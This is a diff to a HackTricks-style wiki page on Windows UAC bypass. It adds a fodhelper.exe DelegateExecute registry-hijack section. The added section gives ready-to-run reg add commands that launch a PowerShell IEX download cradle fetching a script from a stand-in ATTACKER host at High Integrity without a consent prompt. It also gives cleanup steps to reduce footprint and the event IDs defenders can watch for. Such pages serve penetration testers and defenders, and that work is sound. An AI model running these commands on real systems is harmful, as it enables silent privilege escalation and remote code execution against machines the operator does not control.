@@ -154,7 +154,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### KRBUACBypass
 
-Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Documentation and tool in https://github.com/wh0amitz/KRBUACBypass
 
 ### UAC bypass exploits
 
@@ -208,6 +208,38 @@ If you take a look to **UACME** you will note that **most UAC bypasses abuse a D
 
 Consists on watching if an **autoElevated binary** tries to **read** from the **registry** the **name/path** of a **binary** or **command** to be **executed** (this is more interesting if the binary searches this information inside the **HKCU**).
 
+### UAC bypass via fodhelper.exe (DelegateExecute hijack)
+
+When a local admin runs the auto-elevated binary `fodhelper.exe`, Windows resolves the handler for the `ms-settings` protocol by querying the following per-user class registration without filtering the `DelegateExecute` value:
+
+```
+HKCU\Software\Classes\ms-settings\Shell\Open\command
+```
+
+By setting the default value to an arbitrary command and creating an empty `DelegateExecute` value, `fodhelper.exe` will auto-elevate and execute the command at High Integrity without prompting (no consent UI), as long as UAC is not set to "Always notify" and the current token belongs to the local Administrators group.
+
+Requirements:
+- Current shell is Medium Integrity and the user is in Administrators.
+- UAC level is default or lower than "Always notify" (ConsentPromptBehaviorAdmin != 2).
+
+Commands (pop a High Integrity payload and cleanup):
+
+```cmd
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe /c powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/p.ps1')\"" /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+start fodhelper.exe
+reg delete HKCU\Software\Classes\ms-settings /f
+```
+
+Notes and OPSEC:
+- Verify elevation: `whoami /groups | findstr /i "High Mandatory"` (expect High Mandatory Level) or check with Process Explorer.
+- Telemetry: Registry writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command` (Security 4657; Sysmon Event ID 12/13). Process tree shows `fodhelper.exe` spawning `cmd.exe` / `powershell.exe` (Security 4688; Sysmon 1).
+- Cleanup the key to reduce footprint (last line above).
+- Still observed to work on Windows 10 22H2 and Windows 11 23H2 (mid-2025) because `DelegateExecute` is not integrity-checked in this path.
+
+## References
+- [Microsoft Docs – How User Account Control works](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
+- [UACME – Defeating Windows User Account Control](https://github.com/hfiref0x/UACME)
+- [HTB: Rainbow — crash-to-RCE and UAC bypass via fodhelper (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
